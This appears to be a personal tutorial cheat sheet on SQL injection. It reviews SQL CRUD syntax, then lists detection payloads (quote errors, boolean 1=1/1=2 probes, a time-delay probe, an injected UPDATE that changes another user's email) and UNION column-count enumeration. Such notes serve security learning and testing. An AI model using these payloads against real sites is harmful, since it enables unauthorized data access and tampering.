
# SQL Injection Manual

SQL injection is a type of injection attack where attacker injects arbitrary SQL queries into database server using input options


## Important Note

SQL Version and program can be different in different sites
Like MySQL  , PostGrsql , Oracle , MsSQL etc. So the syntax is also different in them. [FOLLOW THIS FOR TESTING](https://portswigger.net/web-security/sql-injection/cheat-sheet)




## CURD Operation In SQL 

Create (INSERT):

```sql
  INSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...)
  INSERT INTO customers (name, email, phone) VALUES ('John Doe', 'john@example.com', '123456789')
```

Read (SELECT):

```sql
  SELECT column1, column2, ... FROM table_name WHERE condition
  SELECT * FROM customers WHERE uid = 1
```

Update (UPDATE):

```sql
  UPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition
  UPDATE customers SET email = 'newemail@example.com' WHERE id = 1
```

Delete (DELETE):

```sql
    DELETE FROM table_name WHERE condition
    DELETE FROM customers WHERE id = 1
```


## SQL Injection Detection and confirmation



```SQL
  # Error Based PAYLOADS [;,--,',",#]
  name=hacker'

  # Condition Based Detection
  name=hacker'and 1=1-- (Sucess Execution)
  select name from users where id=1 and 1=1;--;

  name=hacker'and 1=2-- (Failed  Execution)
  select name from users where id=1 and 1=2;--;


  email=newemial@gmail.com' WHERE id= {not_yours};--
  UPDATE customers SET email = 'newemail@example.com' WHERE id = -1 ;--

  # Blind Based PAYLOADS
  email=test@emial.com' WAITFOR DELAY '0:0:10'--

  
```

## Exploitation

### How Union Works

```sql
# Union is used to concatinate two queries into 1 result and show it to user
Select Column1 , Column2 from table1 Union select column3 and column4 from table2
# This Will Concatinate Column1,Column2,Column3,Column4 at One result
# Rule to make union work (i) Number of columns should be same in two tables
													(ii) Datatypes must be same

# So to determine number of columns called in f
irst query we will use
select ?(don't know) from table1 UNION select NULL
# if the number of column mismatch we will get an error and we have to try again
select ?(don't know) from table1 UNION select NULL,NULL'NULL
# Until we get to know how many columns are called
```
